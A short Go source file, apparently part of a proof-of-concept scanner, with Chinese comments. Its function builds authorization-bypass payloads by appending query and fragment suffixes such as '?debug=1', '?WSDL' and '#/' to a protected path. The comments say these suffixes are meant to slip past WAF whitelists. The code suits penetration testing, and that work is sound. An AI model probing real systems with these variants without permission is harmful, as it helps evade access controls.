package poc

// QueryFragment 生成查询参数和片段污染的 payload
// 精简: 合并语义重复项，保留有实际绕过价值的变体
func QueryFragment(auth string) []string {
	suffixes := []string{
		"?",           // 基础查询标记
		"?anything",   // 带参数（代表类）
		"?debug=1",    // 调试参数（常见 WAF 白名单）
		"?WSDL",       // Web Service 描述文件（常见白名单）
		"#",           // 片段标识符
		"#/",          // 片段 + 路径
		"&",           // 参数分隔符
	}

	var results []string
	for _, s := range suffixes {
		results = append(results, auth+s)
	}
	return results
}
